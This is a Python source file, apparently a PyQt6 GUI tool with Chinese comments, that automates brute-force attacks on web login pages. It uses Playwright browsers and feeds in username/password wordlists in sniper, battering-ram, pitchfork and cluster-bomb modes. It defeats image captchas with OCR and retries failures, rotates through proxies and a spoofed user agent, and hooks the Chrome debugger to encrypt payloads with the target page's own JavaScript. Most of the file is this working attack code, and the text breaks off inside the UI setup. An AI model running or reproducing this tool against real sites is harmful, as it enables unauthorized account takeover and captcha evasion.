from PyQt6.QtWidgets import QFileDialog, QApplication
from PyQt6.QtGui import QGuiApplication

import asyncio
from playwright.async_api import async_playwright, Error
from lxml import etree
from ddddocr import DdddOcr
from pathlib import Path
import re
from PyQt6 import QtCore, QtWidgets
from loguru import logger
from functools import partial

# 这里是自己写的库
from utlis.strEdit import MLineEdit
from utlis.strEdit import cdpencode
from utlis.strEdit import readfile_scan
from utlis.jscode import httpRaw, performjs, performjs_code, performjs_yzm_code, jsrequest, jsrequest_code, \
    js_images_time
from utlis.tools import returndictionary, return_code
from utlis.tools import decode_base64

background_tasks = set()

logger.add("run.log", rotation="10 MB", retention="10 days", level="INFO", enqueue=True)
logger.add("error.log", rotation="10 MB", retention="10 days", level="ERROR", enqueue=True)


class Ui(object):
    http = httpRaw()

    def __init__(self):
        super(Ui, self).__init__()
        self.mode = int()
        self.url = ''
        self.urls = set()
        self.head = True
        self.yzm_list = []
        self.ocr = DdddOcr(show_ad=False)
        self.tasks = []
        self.POSTdata = {
            'username': '',
            'password': ''
        }
        self.CallFrameId = ''
        # 添加一个node计数器，先默认一个node可以请求300次，如果大于300，暂停重启一下。
        self.node = 0

    async def addyzm_list(self):
        if self.yzm_list.count(
                (self.url, self.POSTdata.get("username"), self.POSTdata.get("password"))) < 3:
            self.urls.add((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
            self.yzm_list.append((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
            self.zd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")
            self.sd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")

    async def on_response(self, response):
        if response.request.method == 'POST':
            try:
                html = await response.json()
                if self.zd_yzm_text.text() in str(html) or self.sd_yzm_text.text() in str(html):
                    logger.debug(f"{self.zd_yzm_text.text()} json")
                    await self.addyzm_list()
            except Exception as e:
                logger.debug(f"获取验证码错误值进行匹配 {e}")
                try:
                    if (self.zd_yzm_text.text() in await response.text()
                            or self.sd_yzm_text.text() in await response.text()):
                        logger.debug(f"{self.zd_yzm_text.text()} html 内容")
                    await self.addyzm_list()
                except Exception as e:
                    logger.debug(f"获取验证码错误值进行匹配 {e}")

    def log_clear(self):
        self.zd_start_log.clear()
        self.result_text.clear()
        self.sd_start_log.clear()
        self.urls.clear()
        self.tasks.clear()
        self.announcement.clear()

    async def urls_is_os(self, urls, page_two, setlist, user, passwd):
        if len(urls) != 0:
            result = (f'title:{await page_two.title()} {page_two.url}  '
                      f'长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}')
            logger.info(
                f"title:{await page_two.title()}  {page_two.url} "
                f"长度:{len(await page_two.content())} 账户 {user} 密码 {passwd} ")
            self.result_text.append(str(' {}'.format(result)))
            if self.zd_yzm_text.text() in str(await page_two.content()) or self.sd_yzm_text.text() in str(
                    await page_two.content()):
                await self.addyzm_list()
                await page_two.close()
                self.node = self.node + 1
            else:
                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two.wait_for_timeout(timeouts)
                await page_two.context.clear_cookies()
                await page_two.close()
                self.node = self.node + 1
                self.urls.discard(setlist)
                self.zd_start_log.append("请求队列还剩{}".format(len(self.urls)))
        else:
            timeouts = int(self.zd_delay_text.text()) * 1000
            await page_two.wait_for_timeout(timeouts)
            await page_two.context.clear_cookies()
            await page_two.close()
            self.node = self.node + 1
            self.urls.discard(setlist)
            self.zd_start_log.append("请求队列还剩{}".format(len(self.urls)))

    async def get_url_request(self, context, sem, setlist):
        url = setlist[0]
        self.url = url
        user = setlist[1]
        passwd = setlist[2]
        async with sem:
            page_two_zd = await context.new_page()
            page_two_zd.set_default_timeout(3000 * int(self.zd_delay_text.text()))
            try:
                await page_two_zd.goto(url)
                await page_two_zd.wait_for_load_state(state='networkidle')
                await js_images_time(page_two_zd)
                await page_two_zd.wait_for_timeout(1000)
                html = etree.HTML(await page_two_zd.content())
                # 判断网站是否存在英文数字验证码图片地址
                img_code_url = html.xpath('//img/@src')
                yzm = [u for u in img_code_url if
                       not u.strip().endswith(('.png', '.gif', '.jpg', '.jpeg', '.ico', '.svg')) and len(u) > 1]
                if len(img_code_url) == 0 or len(yzm) == 0:
                    logger.success(
                        f"用户 {user} 使用密码 {passwd} 进行请求")
                    urls = await performjs(page_two_zd, passwd, user)

                    await page_two_zd.wait_for_timeout(1000)
                    await self.urls_is_os(urls, page_two_zd, setlist, user, passwd)
                else:
                    code_str = await return_code(yzm, self.ocr, page_two_zd)
                    logger.success(
                        f"当前请求发现存在验证码 用户 {user} 密码 {passwd}  验证码 {code_str} 验证码链接{yzm}")
                    urls = await performjs_yzm_code(page_two_zd, passwd, user, code_str)
                    await page_two_zd.wait_for_timeout(1000)
                    self.POSTdata['username'] = user
                    self.POSTdata['password'] = passwd
                    await self.urls_is_os(urls, page_two_zd, setlist, user, passwd)
            except Exception as e:
                logger.error(f"函数执行异常 {e}")
                self.announcement.append(f"函数执行异常 {e}")
                self.urls.discard(setlist)
                self.zd_start_log.append("队列还剩{}".format(len(self.urls)))
                self.sd_start_log.append('请求失败{}'.format(setlist))
                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two_zd.wait_for_timeout(timeouts)
                await page_two_zd.close()

    async def get_url_request_sd(self, context, sem, setlist):
        url = setlist[0]
        self.url = url
        user = setlist[1]
        passwd = setlist[2]
        namepath = self.sd_user_text.text()
        passpath = self.sd_pass_text.text()
        loginpath = self.sd_login_text.text()
        yzmpath = self.sd_yzm_text_path.text()
        async with sem:
            page_two = await context.new_page()
            page_two.set_default_timeout(3000 * int(self.sd_delay_text.text()))
            try:
                page_two.on('response', self.on_response)
                await page_two.goto(url)
                await page_two.wait_for_load_state(state='networkidle')
                await page_two.wait_for_timeout(1000)
                html = etree.HTML(await page_two.content())
                # 判断网站是否存在英文数字验证码图片地址
                img_code_url = html.xpath('//img/@src')
                yzm = [u for u in img_code_url if
                       not u.strip().endswith(('.png', '.gif', '.jpg', '.jpeg', '.ico', '.svg')) and len(u) > 1]
                if len(img_code_url) == 0 or len(yzm) == 0:
                    await jsrequest(page_two, namepath, passpath, user, passwd, loginpath)
                    await page_two.wait_for_timeout(1000)
                    result = (f'title:{await page_two.title()} {page_two.url}'
                              f'  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}')
                    self.result_text.append(str(' {}'.format(result)))
                    self.urls.discard(setlist)
                    self.sd_start_log.append("请求队列还剩{}".format(len(self.urls)))
                    timeouts = int(self.sd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
                else:
                    code_str = await return_code(yzm, self.ocr, page_two)
                    await jsrequest_code(page_two, namepath, passpath, yzmpath, user, passwd, code_str, loginpath)
                    await page_two.wait_for_timeout(1000)
                    result = (f'title:{await page_two.title()} {page_two.url}'
                              f'  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}')
                    self.result_text.append(str(' {}'.format(result)))
                    self.urls.discard(setlist)
                    self.sd_start_log.append("请求队列还剩{}".format(len(self.urls)))
                    self.POSTdata['username'] = user
                    self.POSTdata['password'] = passwd
                    timeouts = int(self.sd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
            except Exception as e:
                logger.error(e)
                self.announcement.append(f"函数执行异常 {e}")
                self.urls.discard(setlist)
                self.sd_start_log.append('{}请求失败'.format(setlist))
                self.sd_start_log.append("队列剩余{}".format(len(self.urls)))
                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two.wait_for_timeout(timeouts)
                await page_two.close()

    async def alltasks(self):
        allt = asyncio.all_tasks()
        self.zd_start_log.append(str(len(allt)))
    # 设置回调函数
    def testnode(self, fut, loop):
        if self.node >= 300:
            self.nodewaitingfor()
            self.reget_start(loop)
            logger.success("node 进程次数大于300，重启node进程{}".format(fut))
    async def main(self, loop):
        try:
            async with async_playwright() as asp:
                proxy = self.zd_proxy_text.text() if str(self.zd_proxy_text.text()).startswith(
                    ("http://", "https://")) else None
                browserlaunchoptiondict = {
                    "headless": self.head,
                    "proxy": {
                        "server": proxy,
                    }
                }
                if len(self.zd_proxy_text.text()) < 1:
                    browserlaunchoptiondict.pop("proxy")
                # 配置user-agent
                browse = await asp.chromium.launch(**browserlaunchoptiondict)
                user_agent = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                              " (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
                context = await browse.new_context(ignore_https_errors=True, user_agent=user_agent)
                sem = asyncio.Semaphore(int(self.zd_sem_text.text()))
                while len(self.urls) > 0:
                    try:
                        for url in self.urls.copy():
                            task = asyncio.create_task(self.get_url_request(context, sem, url))
                            task.set_name(url)
                            task.add_done_callback(partial(self.testnode, loop=loop))
                            self.tasks.append(task)
                        await asyncio.wait(self.tasks)
                    except Exception as e:
                        logger.error(e)
                self.zd_start_log.append("爆破程序执行完毕")
                await browse.close()
        except Exception as e:
            logger.error(f"main 启动遇到问题咯 {e}")

    def start_cdp_button(self, loop):
        try:
            taskss = asyncio.all_tasks()
            for key in taskss:
                if "Ui.main_cdp" not in key.get_name():
                    key.cancel()
            start = asyncio.ensure_future(self.main_cdp(), loop=loop)
            background_tasks.add(start)
            start.add_done_callback(lambda t: background_tasks.remove(t))

        except Exception as e:
            logger.error(f"{e} cdp开启错误")

    async def main_cdp(self):
        try:
            async with async_playwright() as playwright:
                browser = await playwright.chromium.launch_persistent_context(
                    headless=False,
                    devtools=True,
                    ignore_https_errors=False,
                    args=['--remote-debugging-port=9222', '--remote-allow-origins=*',
                          '--remote-debugging-address=127.0.0.1'],

                    user_data_dir="./my_data_dir",
                )
                page = await browser.new_page()
                logger.success(f"启动URL  {self.target_url.text()}")
                await page.goto(self.target_url.text())
                await self.add_listener(browser, page)
                await page.wait_for_timeout(10000000)
        except Error as e:
            logger.error(str(e))

    def blastingmode_cdp(self, mode: str):
        code = self.cdp_req_raw_text.toPlainText()
        username = self.password_result_text_user.toPlainText().split('\n')
        password = self.password_result_text_pass.toPlainText().split('\n')

        username_encode = re.findall("(§.*➺§)", code)
        password_encode = re.findall("(§➸.*§)", code)
        targets = []
        result = []
        canshu = []
        if mode == 'sniper:狙击手':
            if username_encode:
                logger.success("用户名加密")
                for key in username:
                    targets.append(re.sub("(§.*➺§)", key, code))
            if password_encode:
                logger.success("密码加密")
                for key in password:
                    targets.append(re.sub("(§➸.*§)", key, code))
                for value in targets:
                    jscode = re.findall("➸➸(.*)➸➸", value)[0]
                    encode = cdpencode(self.CallFrameId, jscode)
                    result.append(re.sub("➸➸(.*)➸➸", encode, value))
                    logger.info(f"参数 加密之后 {encode} \n {re.sub('➸➸(.*)➸➸', encode, value)}")
                    canshu.append(jscode)

            # code标记用来生成字典
        return result, canshu

    def cdp_mark_selected_text_user(self):
        cursor = self.cdp_req_raw_text.textCursor()
        selected_text = cursor.selectedText()
        # 对选中的文本进行标记，这里只是简单地在前后添加方括号
        marked_text = f"§{selected_text}➺§"
        # 替换选中的文本为标记后的文本
        cursor.insertText(marked_text)

    def cdp_mark_selected_text_pass(self):
        cursor = self.cdp_req_raw_text.textCursor()
        selected_text = cursor.selectedText()
        # 对选中的文本进行标记，这里只是简单地在前后添加方括号
        marked_text = f"§➸{selected_text}§"
        # 替换选中的文本为标记后的文本
        cursor.insertText(marked_text)

    def cdp_mark_selected_text_jscode(self):
        cursor = self.cdp_req_raw_text.textCursor()
        selected_text = cursor.selectedText()
        # 对选中的文本进行标记，这里只是简单地在前后添加方括号
        marked_text = f"➸➸{selected_text}➸➸"
        # 替换选中的文本为标记后的文本
        cursor.insertText(marked_text)

    async def on_paused(self, event):
        call_frame_id = event["callFrames"][0]["callFrameId"]
        self.CallFrameId = call_frame_id
        logger.info(f"cdp断点捕获成功  {self.CallFrameId}")

    async def add_listener(self, clients, page):
        # Enable the debugger to listen for pause events.
        client = await clients.new_cdp_session(page)
        await client.send('Debugger.enable')
        client.on("Debugger.paused", lambda event: self.on_paused(event))

    def resultlogapp(self, data):
        self.result_text.append(data)

    async def main_sd(self, loop):
        async with async_playwright() as asp:
            proxy = self.sd_proxy_text.text() if str(self.sd_proxy_text.text()).startswith(
                ("http://", "https://")) else None
            browserlaunchoptiondict = {
                "headless": self.head,
                "proxy": {
                    "server": proxy,
                }

            }
            if len(self.sd_proxy_text.text()) < 1:
                logger.info("当前手动爆破模式并没有设置代理")
                browserlaunchoptiondict.pop("proxy")
            # 配置user-agent
            browse = await asp.chromium.launch(**browserlaunchoptiondict)
            context = await browse.new_context(ignore_https_errors=True)
            sem = asyncio.Semaphore(int(self.sd_sem_text.text()))
            while len(self.urls) > 0:
                try:
                    for url in self.urls.copy():
                        task = asyncio.create_task(self.get_url_request_sd(context, sem, url))
                        task.set_name(url)
                        task.add_done_callback(partial(self.testnode, loop=loop))
                        self.tasks.append(task)
                    await asyncio.wait(self.tasks)
                except Exception as e:
                    logger.error(e)
            self.sd_start_log.append("爆破程序执行完毕")

    # 这里读取批量文件
    def blastingmode(self, mode: str):
        url = self.target_url.text()
        user = self.password_result_text_user.toPlainText().split('\n')
        password = self.password_result_text_pass.toPlainText().split('\n')
        if url.endswith(".txt"):
            data = readfile_scan(url)
            for urls in data:
                if mode == 'sniper:狙击手':
                    if len(user) == 1 and len(password) >= 2:
                        for passwo in password:
                            self.urls.add((urls, user[0], passwo))
                    elif len(password) == 1 and len(user) >= 2:
                        for ur in user:
                            self.urls.add((urls, ur, password[0]))
                    elif len(password) >= 2 and len(user) >= 2:
                        self.zd_start_log.append('狙击手模式，需要用户名设置固定值 密码 设置多个值 或者相反')
                        self.sd_start_log.append('狙击手模式，需要用户名设置固定值 密码 设置多个值 或者相反')
                else:
                    self.zd_start_log.append("暂时没有其他模式")
                    self.sd_start_log.append("暂时没有其他模式")
        else:
            targets = url if url.startswith(('http://', 'https://')) else ''.join(('http://', url))
            if mode == 'sniper:狙击手':
                if len(user) == 1 and len(password) >= 2:
                    '''这里用户名 1位 密码 大于1 '''
                    for passwo in password:
                        self.urls.add((targets, user[0], passwo))
                elif len(password) == 1 and len(user) >= 2:
                    '''这里用户名 大于1位 密码 ==1 '''
                    for ur in user:
                        self.urls.add((targets, ur, password[0]))
                elif len(password) >= 2 and len(user) >= 2:
                    self.zd_start_log.append('狙击手模式，需要用户名设置固定值 密码 设置多个值 或者相反')
                    self.sd_start_log.append('狙击手模式，需要用户名设置固定值 密码 设置多个值 或者相反')
            elif mode == "ram:攻城锤":
                if len(targets) == 1 and len(password) == 1:
                    self.zd_start_log.append('攻城锤模式，需要用户名和密码设置2个以上字符串')
                    self.sd_start_log.append('攻城锤模式，需要用户名和密码设置2个以上字符串')
                    return
                else:
                    payload = set(user + password)
                    for pay in payload:
                        self.urls.add((targets, pay, pay))
            elif mode == "fork:草叉模式":
                if len(user) <= 1 and len(password) <= 1:
                    self.zd_start_log.append('草叉模式，需要用户名和密码设置2个以上字符串')
                    self.sd_start_log.append('草叉模式，需要用户名和密码设置2个以上字符串')
                    return
                else:
                    for name, pay in zip(user, password):
                        self.urls.add((targets, name, pay))
            elif mode == "bomb:集束炸弹":
                if len(user) <= 1 and len(password) <= 1:
                    self.zd_start_log.append('集束炸弹模式，需要用户名和密码设置2个以上字符串')
                    self.sd_start_log.append('集束炸弹模式，需要用户名和密码设置2个以上字符串')
                    return
                elif len(user) <= 1 or len(password) <= 1:
                    self.zd_start_log.append('集束炸弹模式，需要用户名和密码设置2个以上字符串')
                    self.sd_start_log.append('集束炸弹模式，需要用户名和密码设置2个以上字符串')
                else:
                    for name in user:
                        for pay in password:
                            self.urls.add((targets, name, pay))
        # 暂停，重启按钮

    def waitingfor(self):
        # self.log_clear()
        taskss = asyncio.all_tasks()
        for key in taskss:
            if "Task" not in key.get_name() and 'start_blast' not in key.get_name():
                self.urls.add(tuple(eval(key.get_name())))
                key.cancel()
                continue
            else:
                key.cancel()
        self.zd_start_log.append(f"暂停任务剩余{len(self.urls)}")
        self.sd_start_log.append(f"暂停任务剩余{len(self.urls)}")

    # 这里是限制node进行重启不清除响应
    def nodewaitingfor(self):
        taskss = asyncio.all_tasks()
        for key in taskss:
            if "Task" not in key.get_name() and 'start_blast' not in key.get_name():
                self.urls.add(tuple(eval(key.get_name())))
                key.cancel()
                continue
            else:
                key.cancel()
        self.zd_start_log.append(f"暂停任务剩余{len(self.urls)}")
        self.sd_start_log.append(f"暂停任务剩余{len(self.urls)}")

    def export_log(self):
        try:
            with open('result.txt', 'a') as f:
                result = self.result_text.toPlainText().split("\n")
                for log in result:
                    f.write(log + "\n")
                self.zd_start_log.append("导出成功 保存内容到result.txt 文件夹")
                self.sd_start_log.append("导出成功 保存内容到result.txt 文件夹")
        except Exception as e:
            logger.error(e)

        # 按钮区域

    def clear_button_user(self):
        self.password_result_text_user.clear()

    def clear_button_pass(self):
        self.password_result_text_pass.clear()

    def add_button(self):
        if self.add_text_add_user.text():
            self.password_result_text_user.appendPlainText(self.add_text_add_user.text())
            self.add_text_add_user.clear()
        elif self.add_text_add_pass.text():
            self.password_result_text_pass.appendPlainText(self.add_text_add_pass.text())
            self.add_text_add_pass.clear()

    def paste_button_user(self):
        # 创建剪切板对象
        clipboard = QApplication.clipboard()
        # 获取剪切板内容
        text = clipboard.text()
        self.password_result_text_user.appendPlainText(text)

    def paste_button_pass(self):
        # 创建剪切板对象
        clipboard = QApplication.clipboard()
        # 获取剪切板内容
        text = clipboard.text()
        self.password_result_text_pass.appendPlainText(text)

    def load_button_user(self):
        open_file_name = QFileDialog.getOpenFileName()
        if open_file_name[0].endswith(".txt"):
            text = Path(open_file_name[0]).read_text(encoding="utf-8", errors='ignore')
            self.password_result_text_user.appendPlainText(text)

    def load_button_pass(self):
        open_file_name = QFileDialog.getOpenFileName()
        if open_file_name[0].endswith(".txt"):
            text = Path(open_file_name[0]).read_text(encoding="utf-8", errors='ignore')
            self.password_result_text_pass.appendPlainText(text)

    def get_head(self):
        if self.sd_browser_button.text() == 'False' or self.zd_browser_button.text() == "False":
            self.sd_browser_button.setText('True')
            self.zd_browser_button.setText("True")
            self.head = False
        elif self.sd_browser_button.text() == 'True' or self.zd_browser_button.text() == "True":
            self.head = True
            self.sd_browser_button.setText('False')
            self.zd_browser_button.setText("False")

    def reget_start(self, loop):
        logger.success("开启任务重启 node 进程次数初始化0")
        self.node = 0
        if self.tabWidget_mode.currentIndex() == 0:
            try:
                self.zd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main(loop), loop=loop)
            except Exception as e:
                logger.error(str(e))
                self.zd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 1:
            self.sd_start_log.append("手动请求模式启动！")
            try:
                self.sd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main_sd(loop), loop=loop)
            except Exception as e:
                self.sd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 3:
            logger.success(f"cdp模式重新启动")
            try:
                pass
            except Exception as e:
                self.sd_start_log.append(str(e))

    def setupui(self, mainwindow):
        mainwindow.setObjectName("MainWindow")
        mainwindow.setFixedSize(1240, 908)
        # 设置窗口居中
        screen = QGuiApplication.primaryScreen().size()
        size = mainwindow.geometry()
        mainwindow.move(int((screen.width() - size.width()) / 2),
                        int((screen.height() - size.height()) / 2))

        self.centralwidget = QtWidgets.QWidget(mainwindow)
        self.centralwidget.setObjectName("centralwidget")
        self.suspended_button = QtWidgets.QPushButton(self.centralwidget)
        self.suspended_button.setGeometry(QtCore.QRect(730, 2, 90, 40))
        self.suspended_button.setObjectName("suspended_button")
        # MainWindow.setCentralWidget(settings.suspended_button)

        self.result_text = QtWidgets.QTextBrowser(self.centralwidget)
        self.result_text.setGeometry(QtCore.QRect(0, 480, 1240, 390))
        self.result_text.setObjectName("result_text")
        self.export_button = QtWidgets.QPushButton(self.centralwidget)
        self.export_button.setGeometry(QtCore.QRect(970, 2, 90, 40))

        self.export_button.setObjectName("export_button")
        self.restart_button = QtWidgets.QPushButton(self.centralwidget)
        self.restart_button.setGeometry(QtCore.QRect(850, 2, 90, 40))

        self.restart_button.setObjectName("restart_button")
        self.tabWidget_mode = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget_mode.setGeometry(QtCore.QRect(0, 50, 680, 430))

        self.tabWidget_mode.setObjectName("tabWidget_mode")
        self.BLASt_zd = QtWidgets.QWidget()
        self.BLASt_zd.setToolTip("")
        self.BLASt_zd.setObjectName("BLASt_zd")
        self.zd_mode_list = QtWidgets.QComboBox(self.BLASt_zd)
        self.zd_mode_list.setGeometry(QtCore.QRect(120, 20, 140, 20))
        self.zd_mode_list.setObjectName("zd_mode_list")
        self.zd_lable_mode = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_lable_mode.setGeometry(QtCore.QRect(10, 20, 90, 20))
        self.zd_lable_mode.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_lable_mode.setObjectName("zd_lable_mode")
        self.zd_browser_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_browser_label.setGeometry(QtCore.QRect(10, 60, 90, 20))
        self.zd_browser_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_browser_label.setObjectName("zd_browser_label")
        self.zd_delay_lable = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_delay_lable.setGeometry(QtCore.QRect(10, 180, 90, 20))
        self.zd_delay_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_delay_lable.setObjectName("zd_delay_lable")
        self.zd_delay_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_delay_text.setGeometry(QtCore.QRect(120, 180, 140, 20))

        self.zd_delay_text.setToolTipDuration(0)
        self.zd_delay_text.setObjectName("zd_delay_text")
        self.zd_start_run_loglabel = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_start_run_loglabel.setGeometry(QtCore.QRect(10, 240, 160, 40))
        self.zd_start_run_loglabel.setObjectName("zd_start_run_loglabel")
        self.zd_start_log = QtWidgets.QTextBrowser(self.BLASt_zd)
        self.zd_start_log.setGeometry(QtCore.QRect(10, 290, 400, 100))
        self.zd_start_log.setObjectName("zd_start_log")
        self.zd_browser_button = QtWidgets.QRadioButton(self.BLASt_zd)
        self.zd_browser_button.setGeometry(QtCore.QRect(120, 60, 140, 20))
        self.zd_browser_button.setObjectName("zd_browser_button")
        self.zd_yzm_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_yzm_text.setGeometry(QtCore.QRect(280, 60, 160, 80))

        self.zd_yzm_text.setAlignment(
            QtCore.Qt.AlignmentFlag.AlignLeading | QtCore.Qt.AlignmentFlag.AlignLeft | QtCore.Qt.AlignmentFlag.AlignTop)
        self.zd_yzm_text.setObjectName("zd_yzm_text")
        self.zd_yzm_lable = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_yzm_lable.setGeometry(QtCore.QRect(280, 20, 160, 20))
        self.zd_yzm_lable.setObjectName("zd_yzm_lable")
        self.zd_proxy_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_proxy_label.setGeometry(QtCore.QRect(10, 100, 90, 20))
        self.zd_proxy_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_proxy_label.setObjectName("zd_proxy_label")
        self.zd_sem_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_sem_label.setGeometry(QtCore.QRect(10, 140, 90, 20))
        self.zd_sem_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_sem_label.setObjectName("zd_sem_label")
        self.zd_proxy_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_proxy_text.setGeometry(QtCore.QRect(120, 100, 140, 20))

        self.zd_proxy_text.setObjectName("zd_proxy_text")
        self.zd_sem_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_sem_text.setGeometry(QtCore.QRect(120, 140, 140, 20))

        self.zd_sem_text.setObjectName("zd_sem_text")
        self.tabWidget_mode.addTab(self.BLASt_zd, "")
        self.BLAST_sd = QtWidgets.QWidget()
        self.BLAST_sd.setObjectName("BLAST_sd")
        self.sd_start_log = QtWidgets.QTextBrowser(self.BLAST_sd)
        self.sd_start_log.setGeometry(QtCore.QRect(10, 290, 400, 100))
        self.sd_start_log.setObjectName("sd_start_log")
        self.sd_yzm_lab = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_yzm_lab.setGeometry(QtCore.QRect(440, 270, 160, 20))
        self.sd_yzm_lab.setObjectName("sd_yzm_lab")
        self.sd_yzm_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_yzm_text.setGeometry(QtCore.QRect(440, 300, 160, 80))

        self.sd_yzm_text.setObjectName("sd_yzm_text")
        self.sd_mode_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_mode_lable.setGeometry(QtCore.QRect(280, 20, 90, 20))
        self.sd_mode_lable.setObjectName("sd_mode_lable")
        self.sd_mode_list = QtWidgets.QComboBox(self.BLAST_sd)
        self.sd_mode_list.setGeometry(QtCore.QRect(390, 20, 140, 20))
        self.sd_mode_list.setObjectName("sd_mode_list")
        self.sd_user_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_user_text.setGeometry(QtCore.QRect(120, 100, 140, 20))

        self.sd_user_text.setObjectName("sd_user_text")
        self.sd_yzm_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_yzm_lable.setGeometry(QtCore.QRect(10, 180, 90, 20))
        self.sd_yzm_lable.setObjectName("sd_yzm_lable")
        self.sd_pass_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_pass_text.setGeometry(QtCore.QRect(120, 140, 140, 20))

        self.sd_pass_text.setObjectName("sd_pass_text")
        self.sd_login_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_login_lable.setGeometry(QtCore.QRect(11, 220, 90, 20))
        self.sd_login_lable.setObjectName("sd_login_lable")
        self.sd_yzm_text_path = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_yzm_text_path.setGeometry(QtCore.QRect(120, 180, 140, 20))

        self.sd_yzm_text_path.setObjectName("sd_yzm_text_path")
        self.sd_browser_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_browser_lable.setGeometry(QtCore.QRect(10, 20, 90, 20))
        self.sd_browser_lable.setObjectName("sd_browser_liable")
        self.sd_browser_button = QtWidgets.QRadioButton(self.BLAST_sd)
        self.sd_browser_button.setGeometry(QtCore.QRect(120, 20, 140, 20))
        self.sd_browser_button.setObjectName("sd_browser_button")
        self.sd_sen_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_sen_lable.setGeometry(QtCore.QRect(10, 60, 90, 20))
        self.sd_sen_lable.setObjectName("sd_sen_lable")
        self.sd_login_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_login_text.setGeometry(QtCore.QRect(120, 220, 140, 20))

        self.sd_login_text.setObjectName("sd_login_text")
        self.sd_name_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_name_lable.setGeometry(QtCore.QRect(10, 100, 90, 20))
        self.sd_name_lable.setObjectName("sd_name_lable")
        self.sd_sem_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_sem_text.setGeometry(QtCore.QRect(120, 60, 140, 20))

        self.sd_sem_text.setObjectName("sd_sem_text")
        self.sd_pass_lab = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_pass_lab.setGeometry(QtCore.QRect(10, 140, 90, 20))
        self.sd_pass_lab.setObjectName("sd_pass_lab")
        self.sd_proxy_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_proxy_text.setGeometry(QtCore.QRect(390, 60, 140, 20))

        self.sd_proxy_text.setObjectName("sd_proxy_text")
        self.sd_proxy_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_proxy_lable.setGeometry(QtCore.QRect(280, 60, 90, 20))
        self.sd_proxy_lable.setObjectName("sd_proxy_lable")
        self.sd_delay_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_delay_text.setGeometry(QtCore.QRect(390, 100, 140, 20))

        self.sd_delay_text.setObjectName("sd_delay_text")
        self.sd_delay_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_delay_lable.setGeometry(QtCore.QRect(280, 100, 90, 20))
        self.sd_delay_lable.setObjectName("sd_delay_lable")
        self.sd_start_run_loglabel = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_start_run_loglabel.setGeometry(QtCore.QRect(10, 250, 160, 40))
        self.sd_start_run_loglabel.setObjectName("sd_start_run_loglabel")
        self.tabWidget_mode.addTab(self.BLAST_sd, "")
        self.BLAST_cdp = QtWidgets.QWidget()
        self.BLAST_cdp.setObjectName("BLAST_cdp")
        self.cdp_req_raw_text = QtWidgets.QPlainTextEdit(self.BLAST_cdp)
        self.cdp_req_raw_text.setGeometry(QtCore.QRect(0, 70, 530, 340))
        self.cdp_req_raw_text.setObjectName("cdp_req_raw_text")
        self.cdp_start = QtWidgets.QPushButton(self.BLAST_cdp)
        self.cdp_start.setGeometry(QtCore.QRect(550, 10, 110, 30))
        self.cdp_start.setObjectName("cdp_start")
        self.cdp_sem_lable = QtWidgets.QLabel(self.BLAST_cdp)
        self.cdp_sem_lable.setGeometry(QtCore.QRect(20, 40, 60, 16))
        self.cdp_sem_lable.setObjectName("cdp_sem_lable")
        self.cdp_sem = QtWidgets.QLineEdit(self.BLAST_cdp)
        self.cdp_sem.setGeometry(QtCore.QRect(80, 40, 110, 20))
        self.cdp_sem.setObjectName("cdp_sem")
        self.cdp_proxy_lable = QtWidgets.QLabel(self.BLAST_cdp)
